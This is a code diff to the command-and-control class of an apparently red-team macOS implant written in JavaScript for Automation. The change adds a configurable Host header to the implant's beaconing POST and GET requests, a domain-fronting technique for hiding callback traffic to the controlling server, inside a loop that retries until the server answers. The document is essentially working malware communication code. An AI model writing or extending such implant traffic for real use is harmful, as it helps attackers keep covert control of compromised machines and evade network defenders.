@@ -9,6 +9,7 @@ class customC2 extends baseC2{
         this.post_new_callback = "NEWCALLBACK";
         this.post_response = "POSTRESPONSE";
         this.id_field = "IDSTRING";
+        this.host_header = "YYY";
 	}
 	getConfig(){
 		//A RESTful base config consists of the following:
@@ -80,6 +81,9 @@ class customC2 extends baseC2{
 				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
 				var postLength = $.NSString.stringWithFormat("%d", postData.length);
 				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
+				if( this.host_header.length > 3){
+				    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
+				}
 				req.setHTTPBody(postData);
 				var response = Ref();
 				var error = Ref();
@@ -97,8 +101,17 @@ class customC2 extends baseC2{
 	htmlGetData(url){
 	    while(true){
 	        try{
-	            var data = ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
-	            return data;
+	            var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
+                req.setHTTPMethod($.NSString.alloc.initWithUTF8String("GET"));
+                if( this.host_header.length > 3){
+                    req.setValueForHTTPHeaderField($.NSString.alloc.initWithUTF8String(this.host_header), $.NSString.alloc.initWithUTF8String("Host"));
+                }
+                var response = Ref();
+                var error = Ref();
+                var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
+                return ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
+	            //var data = ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
+	            //return data;
 	        }
 	        catch(error){
 	            $.NSThread.sleepForTimeInterval(this.interval); //wait timeout seconds and try again
